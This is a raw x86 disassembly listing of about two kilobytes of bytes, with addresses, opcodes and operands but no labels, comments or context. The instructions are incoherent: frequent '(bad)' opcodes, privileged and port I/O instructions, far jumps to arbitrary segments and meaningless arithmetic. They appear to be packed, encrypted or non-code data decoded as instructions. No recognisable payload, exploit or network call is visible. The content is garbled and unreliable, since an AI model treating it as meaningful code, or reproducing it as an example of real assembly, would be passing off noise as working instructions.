  40223d:	test   ah,dh
  40223f:	push   cs
  402240:	aas    
  402241:	ret    
  402242:	icebp  
  402243:	lods   al,BYTE PTR ds:[esi]
  402244:	sbb    DWORD PTR [ecx+eiz*1+0x63],edx
  402248:	cli    
  402249:	dec    ebx
  40224a:	jl     0x402261
  40224c:	retf   
  40224d:	popf   
  40224e:	loop   0x4021ff
  402250:	inc    ebp
  402251:	jae    0x402262
  402253:	inc    edx
  402254:	pop    ebx
  402255:	mov    ebp,0x389ae785
  40225a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40225b:	je     0x402264
  40225d:	dec    esp
  40225e:	mov    ds:0x441bff59,al
  402263:	jmp    0x40224a
  402265:	jge    0x4022e4
  402267:	in     eax,0x1e
  402269:	adc    bl,dl
  40226b:	inc    ebx
  40226c:	pop    edi
  40226d:	mov    esi,DWORD PTR [edx+0x78]
  402270:	and    eax,0xe4f89c86
  402275:	xchg   ecx,eax
  402276:	sub    al,0xcf
  402278:	push   ebx
  402279:	mov    WORD PTR [esi+0x7f],ds
  40227c:	push   ss
  40227d:	ss jmp 0x895c:0xb803f03e
  402285:	sbb    edi,ebx
  402287:	xchg   BYTE PTR [ecx+0x7e],dh
  40228a:	and    ecx,DWORD PTR [esi]
  40228c:	(bad)  
  40228d:	fmul   st,st(4)
  40228f:	repnz leave 
  402291:	push   es
  402292:	add    DWORD PTR [eax-0x10b64bfa],ecx
  402298:	jmp    0x4022a0
  40229a:	pushf  
  40229b:	nop
  40229c:	(bad)  
  40229d:	and    DWORD PTR [ebp+0x27d17ff7],edx
  4022a3:	neg    DWORD PTR [esp-0x62]
  4022a7:	stc    
  4022a8:	sub    bl,cl
  4022aa:	rol    cl,1
  4022ac:	jbe    0x40229b
  4022ae:	addr16 mov ch,0xe1
  4022b1:	xor    BYTE PTR [eax-0x60],ah
  4022b4:	push   ss
  4022b5:	adc    edx,esi
  4022b7:	ror    ebp,0x69
  4022ba:	pop    DWORD PTR [eax-0x39]
  4022bd:	(bad)  
  4022be:	mov    cl,0xf6
  4022c0:	jb     0x402259
  4022c2:	ins    BYTE PTR es:[edi],dx
  4022c3:	push   ecx
  4022c4:	test   DWORD PTR [ebx-0x54],ebp
  4022c7:	jmp    0x40230c
  4022c9:	jge    0x40233a
  4022cb:	xlat   BYTE PTR ds:[ebx]
  4022cc:	in     al,0x7a
  4022ce:	or     al,0x11
  4022d0:	addr16 pop es
  4022d2:	(bad)  
  4022d3:	into   
  4022d4:	fwait
  4022d5:	mov    al,0x65
  4022d7:	adc    BYTE PTR [edx-0x40],ah
  4022da:	jnp    0x4022ec
  4022dc:	push   ebp
  4022dd:	inc    esi
  4022de:	xor    DWORD PTR [edi],edx
  4022e0:	jmp    0xff4c:0x6ba95c30
  4022e7:	retf   0x39ac
  4022ea:	pop    edx
  4022eb:	sbb    al,0x53
  4022ed:	je     0x402321
  4022ef:	pusha  
  4022f0:	bound  esi,QWORD PTR [esi+0x7c]
  4022f3:	and    al,0x95
  4022f5:	cmp    eax,0x93d9caea
  4022fa:	jae    0x402331
  4022fc:	lods   al,BYTE PTR ds:[esi]
  4022fd:	sbb    al,0xb6
  4022ff:	loope  0x4022d2
  402301:	cdq    
  402302:	pop    edx
  402303:	mov    edx,0xb6d65930
  402308:	lds    ebx,FWORD PTR [edi+0x5855b2fb]
  40230e:	push   0xffffff98
  402310:	in     al,0xbe
  402312:	pusha  
  402313:	leave  
  402314:	leave  
  402315:	mov    BYTE PTR [esi],bh
  402317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402318:	es lock stos DWORD PTR es:[edi],eax
  40231b:	push   cs
  40231c:	jnp    0x4022b0
  40231e:	shl    DWORD PTR [esi],0x90
  402321:	js     0x4022e5
  402323:	sub    eax,0x9f7b7ea6
  402328:	call   0xdc51:0xafd20fec
  40232f:	xchg   DWORD PTR [esi],ebx
  402331:	push   DWORD PTR [ebp-0x455ab8e2]
  402337:	fwait
  402338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402339:	cmp    BYTE PTR [ecx],ch
  40233b:	jno    0x40239c
  40233d:	mov    esp,0x22fd7c1e
  402342:	nop
  402343:	ins    DWORD PTR es:[edi],dx
  402344:	shl    BYTE PTR [edi],0x26
  402347:	imul   ebp,DWORD PTR [esi-0x7d],0x52867167
  40234e:	push   0x4b04dd91
  402353:	sub    DWORD PTR [ebp+0x45],ebp
  402356:	xchg   ecx,eax
  402357:	sti    
  402358:	sbb    eax,0xbb2d3cb5
  40235d:	xor    esi,ebp
  40235f:	mov    ecx,0xe5bfc0bc
  402364:	or     al,dh
  402366:	in     eax,dx
  402367:	cmp    eax,0x16bc4072
  40236c:	shr    BYTE PTR ds:0x835d0e16,0xde
  402373:	sbb    BYTE PTR [ebx-0x691b613f],dl
  402379:	push   es
  40237a:	test   DWORD PTR [ebp-0x5a],edx
  40237d:	jmp    0x402328
  40237f:	adc    dl,bh
  402381:	je     0x4023eb
  402383:	add    DWORD PTR [ecx-0x1a],edx
  402386:	pop    es
  402387:	aas    
  402388:	inc    ebp
  402389:	push   ss
  40238a:	pop    ebp
  40238b:	aad    0x56
  40238d:	cdq    
  40238e:	mov    dh,0xf3
  402390:	out    dx,eax
  402391:	push   edi
  402392:	cmp    eax,0x42d80f87
  402397:	push   esi
  402398:	or     eax,DWORD PTR [esi+0x5a5b4917]
  40239e:	out    0x87,al
  4023a0:	mov    bl,0x6c
  4023a2:	jmp    0xbe1:0x574b8662
  4023a9:	or     eax,0xbd9ad32a
  4023ae:	int    0xa9
  4023b0:	rcl    DWORD PTR [ebp+ebp*1+0x74cd8a2f],cl
  4023b7:	es (bad) 
  4023b9:	iret   
  4023ba:	sbb    esi,DWORD PTR [ecx+eiz*8+0x694ff27d]
  4023c1:	add    al,BYTE PTR [ecx-0x784334a8]
  4023c7:	aam    0x4a
  4023c9:	mov    es,WORD PTR [edx-0x44]
  4023cc:	fdiv   QWORD PTR ds:0xd0b02b72
  4023d2:	jnp    0x402386
  4023d4:	cmp    BYTE PTR [edx],ah
  4023d6:	popf   
  4023d7:	adc    eax,0x3f8efa9a
  4023dc:	or     ebp,ecx
  4023de:	jg     0x402428
  4023e0:	inc    ebp
  4023e1:	mov    DWORD PTR [esi],0x5ae93d40
  4023e7:	std    
  4023e8:	push   edi
  4023e9:	push   es
  4023ea:	pop    ebp
  4023eb:	and    DWORD PTR [ebx],0x42
  4023ee:	inc    ebx
  4023ef:	cld    
  4023f0:	ins    BYTE PTR es:[edi],dx
  4023f1:	shr    esi,cl
  4023f3:	push   0xfba2c77f
  4023f8:	rcr    DWORD PTR [edx+edi*1-0x4e],1
  4023fc:	pop    ds
  4023fd:	arpl   WORD PTR [ecx-0x2edab615],si
  402403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402404:	ds jb  0x4023cc
  402407:	ins    BYTE PTR es:[edi],dx
  402408:	adc    eax,0x66248a82
  40240d:	sahf   
  40240e:	bound  edi,QWORD PTR gs:[ecx]
  402411:	int    0xc4
  402413:	or     dh,bl
  402415:	and    cl,BYTE PTR [esi+0x3a]
  402418:	pop    edi
  402419:	push   edx
  40241a:	scas   al,BYTE PTR es:[edi]
  40241b:	inc    ebp
  40241c:	int    0x18
  40241e:	sub    eax,0x22582eb8
  402423:	push   edi
  402424:	or     ebp,eax
  402426:	sub    al,bh
  402428:	ins    DWORD PTR es:[edi],dx
  402429:	mov    bh,BYTE PTR [ebp+esi*1-0x24]
  40242d:	xor    al,0xf1
  40242f:	mov    edi,0xbe7664a6
  402434:	xor    cl,BYTE PTR [ebp+0x3]
  402437:	xor    al,0x6d
  402439:	jge    0x402461
  40243b:	jp     0x402491
  40243d:	mov    ds:0xce3b6674,eax
  402442:	mov    esi,0x1ed29aa5
  402447:	mov    edx,DWORD PTR [edi]
  402449:	mov    bh,0x6a
  40244b:	mov    esi,0xcf8c25b3
  402450:	lods   eax,DWORD PTR ds:[esi]
  402451:	dec    esp
  402452:	mov    ch,0x1c
  402454:	mov    bl,0xa
  402456:	or     BYTE PTR [edi+esi*8+0x6e6374ed],bh
  40245d:	xor    bh,BYTE PTR [ebp+edi*4+0xf]
  402461:	mov    cl,0xc8
  402463:	mov    cl,0xf4
  402465:	xor    BYTE PTR [edx-0x34],al
  402468:	add    al,0x4f
  40246a:	stc    
  40246b:	inc    ebx
  40246c:	jne    0x4024ae
  40246e:	aas    
  40246f:	std    
  402470:	popa   
  402471:	or     edx,DWORD PTR [edi-0x51]
  402474:	int    0x98
  402476:	mov    esi,0x4d06a292
  40247b:	xor    eax,0xfb39be9b
  402480:	jmp    0x82c4f456
  402485:	xor    edx,DWORD PTR [edi+0x3f]
  402488:	cs stos DWORD PTR es:[edi],eax
  40248a:	add    DWORD PTR [eax+0x477561d5],ebx
  402490:	test   al,0x72
  402492:	mov    edi,0xc12acc92
  402497:	leave  
  402498:	mov    ebp,0x2da4e77
  40249d:	std    
  40249e:	mov    esp,0xcc24d637
  4024a3:	push   esp
  4024a4:	dec    edx
  4024a5:	mov    dh,0xcc
  4024a7:	mov    BYTE PTR [esi-0x3a1e0b7a],bh
  4024ad:	push   edx
  4024ae:	sbb    BYTE PTR [ebp+0x6177114a],bl
  4024b4:	pop    es
  4024b5:	sbb    al,0x75
  4024b7:	rcr    DWORD PTR [ecx-0x7750e6c0],cl
  4024bd:	je     0x4024ef
  4024bf:	jmp    FWORD PTR [edi]
  4024c1:	adc    al,0xb7
  4024c3:	int    0xb8
  4024c5:	enter  0xf09c,0x58
  4024c9:	dec    ecx
  4024ca:	push   esi
  4024cb:	and    eax,0xe554d161
  4024d0:	xor    eax,0x940e43ac
  4024d5:	fwait
  4024d6:	cmp    DWORD PTR [esi-0x72c4e298],ebx
  4024dc:	repz aam 0xdc
  4024df:	in     eax,0xd2
  4024e1:	fs aaa 
  4024e3:	rcl    BYTE PTR [bx],0xcb
  4024e7:	xor    eax,0xd292fd9
  4024ec:	pop    ecx
  4024ed:	leave  
  4024ee:	jle    0x40254c
  4024f0:	adc    dh,bh
  4024f2:	icebp  
  4024f3:	mov    BYTE PTR [esi-0x50],dl
  4024f6:	in     al,dx
  4024f7:	inc    ecx
  4024f8:	jmp    DWORD PTR [edx+0x699b6410]
  4024fe:	sbb    eax,0xd76fd9f
  402503:	clc    
  402504:	sbb    al,0x82
  402506:	stos   DWORD PTR es:[edi],eax
  402507:	pop    ebp
  402508:	hlt    
  402509:	add    eax,DWORD PTR [ebx+0x15fb5762]
  40250f:	cwde   
  402510:	mov    eax,0xafdefefc
  402515:	mov    ecx,0xca731c57
  40251a:	clc    
  40251b:	fwait
  40251c:	out    0x40,ax
  40251f:	lods   al,BYTE PTR ds:[esi]
  402520:	mov    ecx,0xf298bb94
  402525:	iret   
  402526:	hlt    
  402527:	sti    
  402528:	fst    QWORD PTR [edi-0x3b]
  40252b:	clc    
  40252c:	xchg   ecx,eax
  40252d:	enter  0xaf4e,0x29
  402531:	in     al,dx
  402532:	fadd   DWORD PTR [edi]
  402534:	in     al,dx
  402535:	sbb    al,0x25
  402537:	cmp    DWORD PTR [esi-0x7d],esi
  40253a:	mov    DWORD PTR [esi],ebx
  40253c:	lock mov esp,DWORD PTR [eax]
  40253f:	add    edi,DWORD PTR [edx]
  402541:	ror    DWORD PTR [ecx+0x50],cl
  402544:	dec    eax
  402545:	and    al,0x8a
  402547:	pop    eax
  402548:	inc    ebp
  402549:	mov    ebp,0x84c8a02b
  40254e:	mov    eax,0x6c8ab772
  402553:	addr16 cmp al,0x89
  402556:	and    al,0xb
  402558:	mov    DWORD PTR [eax+0x3495f920],edx
  40255e:	adc    ebp,DWORD PTR [edx+ecx*4]
  402561:	inc    ebp
  402562:	push   edi
  402563:	(bad)  
  402564:	imul   ecx,edx,0xffffffa0
  402567:	push   0xfffffff1
  402569:	aaa    
  40256a:	sbb    eax,0x11e0e151
  40256f:	imul   ecx,DWORD PTR [ebp-0x6cb340d6],0xffffff81
  402576:	sbb    edi,ebp
  402578:	pop    edx
  402579:	cmp    eax,0xd12efb1
  40257e:	rcr    DWORD PTR [esi-0x20d410fb],cl
  402584:	pop    edi
  402585:	adc    al,0xe1
  402587:	test   BYTE PTR [ecx],bh
  402589:	lahf   
  40258a:	cmp    eax,0xbe19ec7a
  40258f:	ss pop ebx
  402591:	sti    
  402592:	mov    esi,0x9ff0d8ad
  402597:	mov    dh,0x3c
  402599:	dec    BYTE PTR [esi-0x258df430]
  40259f:	hlt    
  4025a0:	es or  ax,sp
  4025a4:	mov    ds:0x505690a2,al
  4025a9:	dec    esp
  4025aa:	idiv   DWORD PTR gs:[ebx]
  4025ad:	fisttp QWORD PTR [ecx+0x42]
  4025b0:	sahf   
  4025b1:	gs int 0xe7
  4025b4:	add    ah,BYTE PTR [esi]
  4025b6:	pop    ebp
  4025b7:	mov    ecx,0x5b29811f
  4025bc:	xor    eax,0x3499b2ab
  4025c1:	jl     0x402577
  4025c3:	hlt    
  4025c4:	inc    ebx
  4025c5:	push   ebx
  4025c6:	mov    WORD PTR [edx+ecx*4],cs
  4025c9:	dec    eax
  4025ca:	mov    WORD PTR [ebx+0x6a],cs
  4025cd:	addr16 inc edi
  4025cf:	push   edx
  4025d0:	lea    esi,[edi+0x12]
  4025d3:	pusha  
  4025d4:	fs fstp st(5)
  4025d7:	push   eax
  4025d8:	data16 mov ds:0x1265734c,al
  4025de:	sub    DWORD PTR ss:[esi+0x20],0x4c2e93f
  4025e6:	pop    ecx
  4025e7:	xor    bl,BYTE PTR [ebp+0x55444520]
  4025ed:	ins    BYTE PTR es:[edi],dx
  4025ee:	std    
  4025ef:	jo     0x402626
  4025f1:	push   di
  4025f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f4:	mov    al,ds:0x1b768c6b
  4025f9:	sub    BYTE PTR [ebx],bl
  4025fb:	or     edx,DWORD PTR [ecx+0xed0ee86]
  402601:	lock mov cl,0x19
  402604:	lahf   
  402605:	push   0x9456bb59
  40260a:	mov    ch,0x81
  40260c:	dec    ecx
  40260d:	ss pop ebx
  40260f:	and    ebp,DWORD PTR [edi-0x4d]
  402612:	in     al,0x53
  402614:	sub    ebx,edi
  402616:	and    al,0x18
  402618:	or     BYTE PTR [ecx-0x95d97b9],dl
  40261e:	jns    0x40268d
  402620:	cmp    al,0xa8
  402622:	dec    edi
  402623:	nop
  402624:	sub    BYTE PTR [edi-0x686eded1],bl
  40262a:	push   ebp
  40262b:	fist   WORD PTR [esi]
  40262d:	pop    edx
  40262e:	repnz pop ecx
  402630:	mov    ah,BYTE PTR [edi+esi*8-0x3d]
  402634:	bound  edx,QWORD PTR ds:0xf32485de
  40263a:	add    esp,DWORD PTR [ecx]
  40263c:	mov    WORD PTR [edx],?
  40263e:	aad    0x55
  402640:	mov    cl,0xd7
  402642:	les    eax,FWORD PTR [esi-0x67]
  402645:	icebp  
  402646:	cwde   
  402647:	jne    0x402640
  402649:	mov    bl,0xd4
  40264b:	test   edi,edi
  40264d:	and    al,0x96
  40264f:	out    dx,eax
  402650:	jl     0x402691
  402652:	dec    esi
  402653:	mov    edx,DWORD PTR [ebx-0x66]
  402656:	arpl   WORD PTR ds:0xca2e09e8,bp
  40265c:	pop    ds
  40265d:	fcmovnbe st,st(6)
  40265f:	add    dh,BYTE PTR [eax-0x3aef7fae]
  402665:	sahf   
  402666:	repnz mov al,BYTE PTR [edx+0x29]
  40266a:	leave  
  40266b:	inc    BYTE PTR [ecx-0x47]
  40266e:	lods   eax,DWORD PTR ds:[esi]
  40266f:	test   DWORD PTR [edx+0x55],edi
  402672:	jnp    0x4026e1
  402674:	and    bl,BYTE PTR [edi+0x6c]
  402677:	mov    ch,0x95
  402679:	xor    BYTE PTR [ecx+0x72],dh
  40267c:	xchg   DWORD PTR [esp+esi*8-0x4157215f],edx
  402683:	in     eax,0x2
  402685:	add    dl,BYTE PTR [ecx+0x7d8fc693]
  40268b:	mov    bl,0x85
  40268d:	adc    al,0x67
  40268f:	mov    ds:0xdde64d20,al
  402694:	je     0x4026e4
  402696:	dec    ebp
  402697:	dec    edx
  402698:	retf   0x3cf9
  40269b:	lgs    edx,FWORD PTR [ebx+edi*4+0x3559f08a]
  4026a3:	rol    BYTE PTR [ebp+0x6f46d327],cl
  4026a9:	aad    0xf2
  4026ab:	repz loopne 0x4026e2
  4026ae:	sub    esi,DWORD PTR [edx+0x2a]
  4026b1:	jae    0x402682
  4026b3:	xchg   esi,eax
  4026b4:	push   ebp
  4026b5:	xor    al,0x80
  4026b7:	hlt    
  4026b8:	inc    ecx
  4026b9:	dec    ebp
  4026ba:	sbb    BYTE PTR [esi+0x6d],al
  4026bd:	inc    esi
  4026be:	cmp    eax,0x25d638f4
  4026c3:	sub    eax,0xb2fe2984
  4026c8:	push   ecx
  4026c9:	(bad)  
  4026ca:	pop    ebx
  4026cb:	neg    BYTE PTR [ebp+edx*2+0x29]
  4026cf:	sub    DWORD PTR [esi-0x14],edi
  4026d2:	outs   dx,BYTE PTR ds:[esi]
  4026d3:	outs   dx,DWORD PTR ds:[esi]
  4026d4:	out    0x83,al
  4026d6:	mov    ch,0xd6
  4026d8:	mov    edx,0x7af97c83
  4026dd:	dec    esi
  4026de:	fs pusha 
  4026e0:	out    0x94,al
  4026e2:	mov    ah,0x9d
  4026e4:	in     al,0xdd
  4026e6:	je     0x402731
  4026e8:	loop   0x40269d
  4026ea:	loop   0x402749
  4026ec:	dec    eax
  4026ed:	frstor [ebp+0x33]
  4026f0:	dec    ebx
  4026f1:	jl     0x40274d
  4026f3:	cmp    ecx,DWORD PTR [edx]
  4026f5:	loopne 0x402722
  4026f7:	nop
  4026f8:	je     0x4026af
  4026fa:	cmp    edx,DWORD PTR [eax-0x41]
  4026fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fe:	int    0xd5
  402700:	test   DWORD PTR [eax],esi
  402702:	lods   al,BYTE PTR ds:[esi]
  402703:	sbb    BYTE PTR ds:[ebp-0x14484134],cl
  40270a:	dec    ecx
  40270b:	inc    edx
  40270c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40270d:	das    
  40270e:	ss ss (bad) 
  402711:	imul   esi,DWORD PTR [eax+eiz*2],0xa65c0dfb
  402718:	jo     0x4026d9
  40271a:	leave  
  40271b:	xor    BYTE PTR [bp-0x2571],0xf2
  402721:	mov    ch,0x7a
  402723:	mov    ds:0x25e43f27,eax
  402728:	mov    ecx,0xc8704c29
  40272d:	xor    DWORD PTR [ebp-0x2f],0x6f
  402731:	imul   edx,ecx,0xbfc03e77
  402737:	outs   dx,BYTE PTR ds:[esi]
  402738:	jmp    0x40277f
  40273a:	mov    bl,0x26
  40273c:	repnz and eax,0x1f756b53
  402742:	retf   0xb5e3
  402745:	dec    ecx
  402746:	adc    BYTE PTR [edi+eax*2-0x292fddea],0x67
  40274e:	pop    edi
  40274f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402750:	cmp    ch,BYTE PTR [edx+0x7fb7fa09]
  402756:	(bad)  
  402757:	cmc    
  402758:	enter  0x5570,0x57
  40275c:	cmp    dh,BYTE PTR [esi-0x68707125]
  402762:	pop    ds
  402763:	lds    edx,FWORD PTR [esi+0x23c7af2]
  402769:	push   esp
  40276a:	mov    ebp,0xb715179d
  40276f:	or     DWORD PTR [ebx],esi
  402771:	repnz ficom WORD PTR [esi-0x5]
  402775:	lods   al,BYTE PTR ds:[esi]
  402776:	sub    eax,0x23a39458
  40277b:	xor    eax,0xd34010a1
  402780:	mov    bl,0x6a
  402782:	in     eax,dx
  402783:	ret    
  402784:	sub    bh,bh
  402786:	adc    bl,BYTE PTR [edi+0x33f5730]
  40278c:	dec    esp
  40278d:	sub    DWORD PTR [esi-0x5a],ebx
  402790:	adc    ebp,DWORD PTR [eax+0x54]
  402793:	fsub   QWORD PTR [edx]
  402795:	scas   eax,DWORD PTR es:[edi]
  402796:	mov    cl,BYTE PTR [edx-0x37d9edc4]
  40279c:	fptan  
  40279e:	mov    edi,0xdb093011
  4027a3:	sub    eax,0x218a26b1
  4027a8:	in     al,0xdb
  4027aa:	and    ebp,DWORD PTR [ebx+edi*4-0x34]
  4027ae:	jmp    0x6911:0x38c57d7a
  4027b5:	jg     0x402767
  4027b7:	fdiv   st,st(1)
  4027b9:	cmc    
  4027ba:	jae    0x402784
  4027bc:	repnz mov cl,0x11
  4027bf:	mov    eax,0xaecf28fa
  4027c4:	and    BYTE PTR [ecx-0x7097818e],bh
  4027ca:	push   esi
  4027cb:	(bad)  
  4027cc:	sub    edx,esi
  4027ce:	add    ebx,DWORD PTR [esi+0x48dfb099]
  4027d4:	out    0xbf,eax
  4027d6:	push   ss
  4027d7:	push   ecx
  4027d8:	repnz hlt 
  4027da:	add    DWORD PTR [ebx+0x39],edx
  4027dd:	add    BYTE PTR [edi-0x71764ba3],al
  4027e3:	dec    eax
  4027e4:	leave  
  4027e5:	and    al,0x38
  4027e7:	mov    al,ds:0xbb5124a
  4027ec:	aaa    
  4027ed:	mov    BYTE PTR [edi*4-0x2686e48d],ch
  4027f4:	fstp   st(6)
  4027f6:	sbb    DWORD PTR [ebp-0x3ffc1433],0x45389969
  402800:	xor    eax,0x4f3f5d2e
  402805:	test   eax,0xc6d7cef4
  40280a:	jno    0x4027da
  40280c:	add    DWORD PTR [edi+0x1496456b],ecx
  402812:	jmp    0x79839e3b
  402817:	inc    ebx
  402818:	sbb    ch,cl
  40281a:	mov    al,ds:0x64007af4
  40281f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402820:	jmp    0x4b2ccd59
  402825:	mov    ds:0x54c2868f,eax
  40282a:	not    DWORD PTR [edx-0x2a]
  40282d:	adc    al,0xde
  40282f:	repnz dec eax
  402831:	sar    BYTE PTR [ebx-0x306e2d46],cl
  402837:	mov    es,WORD PTR [eax]
  402839:	emms   
  40283b:	ins    DWORD PTR es:[edi],dx
  40283c:	gs jnp 0x40284d
  40283f:	adc    al,0xe8
  402841:	fcmovnbe st,st(7)
  402843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402844:	sbb    DWORD PTR [edx-0x4aa9a2f7],edi
  40284a:	push   cs
  40284b:	(bad)  
  40284c:	cld    
  40284d:	jge    0x402868
  40284f:	sub    al,BYTE PTR [eax]
  402851:	xchg   edx,eax
  402852:	vpsubb xmm7,xmm5,XMMWORD PTR [esi+0x6e8e07e5]
  40285a:	add    eax,0x2d0f8886
  40285f:	retf   0x2b5e
  402862:	xchg   ebp,eax
  402863:	or     eax,0x3f8cf176
  402868:	inc    edx
  402869:	lea    ebp,[esi-0x50]
  40286c:	xlat   BYTE PTR ds:[ebx]
  40286d:	sahf   
  40286e:	jno    0x402838
  402870:	inc    eax
  402871:	and    cl,dl
  402873:	leave  
  402874:	jnp    0x4027fc
  402876:	xchg   ecx,eax
  402877:	outs   dx,DWORD PTR ds:[esi]
  402878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402879:	ds stc 
  40287b:	xchg   BYTE PTR [ebx-0x25],cl
  40287e:	push   ds
  40287f:	jmp    0x402815
  402881:	cmp    BYTE PTR [ebx-0x5352cd8a],al
  402887:	test   eax,0x628da35e
  40288c:	call   0xe07d:0x953db70a
  402893:	sub    bh,BYTE PTR [ebx]
  402895:	pusha  
  402896:	(bad)  
  402897:	sbb    al,0x9e
  402899:	imul   edx,DWORD PTR [eax],0xffffffe5
  40289c:	jl     0x402879
  40289e:	loope  0x4028f4
  4028a0:	lea    ebx,[edi]
  4028a2:	add    dh,BYTE PTR [ecx-0x70e4cbf6]
  4028a8:	jecxz  0x40283d
  4028aa:	ins    DWORD PTR es:[edi],dx
  4028ab:	sub    esi,DWORD PTR [ecx]
  4028ad:	push   ds
  4028ae:	or     DWORD PTR [ecx+ebx*4+0x28],ecx
  4028b2:	fdiv   QWORD PTR [ebx-0x54]
  4028b5:	fwait
  4028b6:	inc    ebx
  4028b7:	repnz rcr BYTE PTR [edx+0x0],0x65
  4028bc:	mov    bh,0x66
  4028be:	dec    eax
  4028bf:	add    eax,0xdcfd99a4
  4028c4:	or     bh,BYTE PTR [ebp-0x4d35026f]
  4028ca:	cli    
  4028cb:	mov    esp,0x4899c562
  4028d0:	sti    
  4028d1:	retf   
  4028d2:	lods   al,BYTE PTR ds:[esi]
  4028d3:	leave  
  4028d4:	pop    edi
  4028d5:	xor    al,0xfc
  4028d7:	sti    
  4028d8:	pop    edi
  4028d9:	push   cs
  4028da:	adc    eax,0x465670a6
  4028df:	and    DWORD PTR [eax-0x3b45e9f0],ebx
  4028e5:	sar    BYTE PTR [ecx-0x1c11093e],1
  4028eb:	mov    WORD PTR [ebx-0xb0a7412],ss
  4028f1:	test   eax,0xe6553189
  4028f6:	push   es
  4028f7:	ds lock aas 
  4028fa:	loopne 0x402940
  4028fc:	sbb    bh,dl
  4028fe:	(bad)  [ecx-0x73]
  402901:	ss inc edx
  402903:	outs   dx,BYTE PTR ds:[esi]
  402904:	(bad)  
  402905:	pop    esp
  402906:	jae    0x402976
  402908:	xchg   ebx,eax
  402909:	jbe    0x4028c5
  40290b:	shl    DWORD PTR [eax],1
  40290d:	rcl    DWORD PTR [ebx-0x6f034464],cl
  402913:	dec    edx
  402914:	lea    esp,[esp+edx*2]
  402917:	push   eax
  402918:	imul   esi,DWORD PTR [edx-0xb],0x5e
  40291c:	jmp    0x2bf668e0
  402921:	dec    edi
  402922:	stos   BYTE PTR es:[edi],al
  402923:	sub    ecx,DWORD PTR [eax+ecx*8+0x10983f87]
  40292a:	jo     0x40294b
  40292c:	pop    ebp
  40292d:	jno    0x402906
  40292f:	sbb    al,BYTE PTR [eax]
  402931:	pop    esp
  402932:	iret   
  402933:	inc    edi
  402934:	not    BYTE PTR [edi-0x3]
  402937:	mov    ebx,0x2a3071a0
  40293c:	sbb    DWORD PTR [edx],ebx
  40293e:	or     edi,DWORD PTR [esi-0x21dd584]
  402944:	or     BYTE PTR [eax+0x5f],bh
  402947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402948:	je     0x4028cc
  40294a:	or     ah,BYTE PTR [eax-0x1a3bb1f6]
  402950:	push   ebx
  402951:	sar    DWORD PTR [edi],0x7f
  402954:	popa   
  402955:	aad    0x5e
  402957:	mov    edx,0x3e8248a4
  40295c:	jb     0x4029a0
  40295e:	into   
  40295f:	jnp    0x402906
  402961:	pusha  
  402962:	sub    eax,0xf42e3382
  402967:	es loope 0x4028f2
  40296a:	imul   ecx
  40296c:	sar    ebx,1
  40296e:	inc    edx
  40296f:	imul   edi,DWORD PTR [edx-0x10419290],0xa4b28752
  402979:	in     eax,0xa2
  40297b:	inc    edi
  40297c:	jno    0x402995
  40297e:	push   ds
  40297f:	adc    al,0xd4
  402981:	div    DWORD PTR [ebx+0x37146b49]
  402987:	jge    0x4029ee
  402989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40298a:	cmp    esi,esi
  40298c:	out    0xf0,al
  40298e:	and    cl,BYTE PTR [ecx]
  402990:	dec    ecx
  402991:	xor    DWORD PTR [esi+edi*2-0x45],ecx
  402995:	and    DWORD PTR [ecx+0x27],esi
  402998:	fisttp DWORD PTR [edx+0x34]
  40299b:	sub    eax,0x4431a4af
  4029a0:	push   ebp
  4029a1:	fnsave [edx]
  4029a3:	dec    ecx
  4029a4:	je     0x402956
  4029a6:	push   0xa20546aa
  4029ab:	xchg   DWORD PTR [edi],eax
  4029ad:	mov    ch,BYTE PTR [ebp-0x42]
  4029b0:	jecxz  0x402993
  4029b2:	mov    edi,0xd1e61404
  4029b7:	push   esi
  4029b8:	xchg   edi,eax
  4029b9:	daa    
  4029ba:	adc    DWORD PTR [edi+0x1500de46],ebx
  4029c0:	sub    ch,BYTE PTR [eax]
  4029c2:	or     BYTE PTR [eax-0x4f04ce00],0x99
  4029c9:	pop    eax
  4029ca:	dec    edx
  4029cb:	or     bh,BYTE PTR [edx+0x63f4276b]
  4029d1:	dec    ebx
  4029d2:	inc    ebp
  4029d3:	aaa    
  4029d4:	mov    dl,0x6a
  4029d6:	ret    0xf0fb
  4029d9:	fwait
  4029da:	cld    
  4029db:	and    al,0xda
  4029dd:	popa   
  4029de:	dec    esp
  4029df:	mov    cl,0xff
  4029e1:	jno    0x4029c9
  4029e3:	cmp    cl,bh
  4029e5:	xor    al,0x84
  4029e7:	je     0x4029b2
  4029e9:	ret    
  4029ea:	(bad)
  4029ed:	loop   0x4029a4
  4029ef:	push   ebx
  4029f0:	jb     0x402a6e
  4029f2:	dec    ebx
  4029f3:	xor    edx,DWORD PTR [esi+0x1d]
  4029f6:	sbb    eax,0x3077e070
  4029fb:	js     0x402a49
  4029fd:	sbb    al,0x47
  4029ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a01:	fimul  DWORD PTR [esi]
  402a03:	adc    bh,BYTE PTR [ecx]
  402a05:	hlt    
  402a06:	dec    eax
  402a07:	pop    edx
  402a08:	fadd   QWORD PTR [esi-0x46a3eaac]
  402a0e:	dec    edx
  402a0f:	xchg   DWORD PTR [eax-0x37],esi
  402a12:	mov    dx,0x60dc
  402a16:	sbb    eax,0xff5032c1
  402a1b:	jo     0x402a74
  402a1d:	xor    al,0xea
  402a1f:	(bad)  
  402a20:	mov    ecx,0x59ea56b2
  402a25:	cwde   
  402a26:	mov    edi,0xa511fa07
  402a2b:	imul   eax,edi,0x61
  402a2e:	xchg   BYTE PTR [edi+eax*1-0x22c972a6],bh
  402a35:	mov    dh,0x6e
  402a37:	lahf   
  402a38:	or     dl,BYTE PTR [edi+edi*8]
  402a3b:	mov    ch,0x87
  402a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3e:	icebp  
